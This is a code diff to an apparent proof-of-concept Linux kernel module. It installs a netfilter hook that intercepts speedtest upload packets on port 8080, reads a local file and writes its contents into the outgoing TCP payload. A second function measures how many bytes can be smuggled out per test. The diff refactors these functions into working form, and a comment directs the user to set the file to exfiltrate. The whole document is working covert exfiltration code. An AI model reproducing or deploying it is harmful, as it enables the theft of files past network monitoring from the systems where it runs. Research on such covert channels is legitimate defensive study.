@@ -43,7 +43,7 @@ static unsigned long total_exfiled_bytes = 0;
 static struct nf_hook_ops *nfho = NULL; 
 
 //function that demonstrates the exfiltration of a test file.
-static void exfil_file(void) {
+static unsigned int exfil_file(struct sk_buff *skb, int offset) {
     //file variables
     struct file *testfile;
     char buffer[100];
@@ -51,7 +51,7 @@ static void exfil_file(void) {
     ssize_t bytes_read;
 
     //Open the file
-    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0); //modify test file to exfiltrate here
+    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0); //change to the file you want to exfiltrate
     if (IS_ERR(testfile)) {
         //pr_err("Failed to open file\n");
         return NF_ACCEPT;
@@ -77,22 +77,24 @@ static void exfil_file(void) {
     filp_close(testfile, NULL);
 
     //store file in TCP payload
-    skb_store_bits(skb, tcp_payloadoffset, buffer, bytes_read);
+    skb_store_bits(skb, offset, buffer, bytes_read);
+    return NF_ACCEPT;
 
 }
-//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single Speedtest. 
-static void max_bytes_exfiled(void) {
+//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest. 
+static unsigned int max_bytes_exfiled(struct sk_buff *skb, int offset, int len) {
     int i;
     char random;
     
     //overwrite the TCP payload with random bytes 
-    for (i = 0; i < tcp_payloadlen; i++) {
-        random = (i * 31 + 17) & 0XFF;			//get_random_bytes and jiffies slows down speed test reported speeds, using Linear Congruential Generator
-        skb_store_bits(skb, tcp_payloadoffset + i, &random, 1);
+    for (i = 0; i < len; i++) {
+        random = (i * 31 + 17) & 0XFF;	//get_random_bytes and jiffies slows down speed test reported speeds, using Linear Congruential Generator
+        skb_store_bits(skb, offset + i, &random, 1);
     }
     
     //add up TCP payload lengths
-    total_exfiled_bytes += tcp_payloadlen;
+    total_exfiled_bytes += len;
+    return NF_ACCEPT;
 }
 //hook function that filters on the PSH/ACK upload speed packets, calls PoC functions, and recalculates checksums. 
 static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
@@ -138,7 +140,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 	//total packet length
 	total_len = ntohs(ip_header->tot_len);
 
-    //filtering on the PSH/ACK upload speed packets over port 8080 - Please be mindful that other TCP traffic could hit on this conditional statement!
+    //filtering on the PSH/ACK upload speed packets over port 8080 - Please be mindful that this could hit on other TCP traffic matching the conditional statement
 	if (ntohs(tcp_header->dest) == 8080 &&
 		 source_ip == client_ip &&
 		 tcp_header->fin == 0 &&
@@ -163,10 +165,10 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 		tcp_payloadlen = total_len - ip_hdr_len - tcp_hdr_len;
 
         //call function that demos exfil of a test file
-        exfil_file();
+        exfil_file(skb, tcp_payloadoffset);
 
 		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
-        //max_exfiled_bytes();
+        //max_exfiled_bytes(skb, tcp_payloadoffset, tcp_payloadlen);
        
         //zero out checksum
         tcp_header->check = 0;
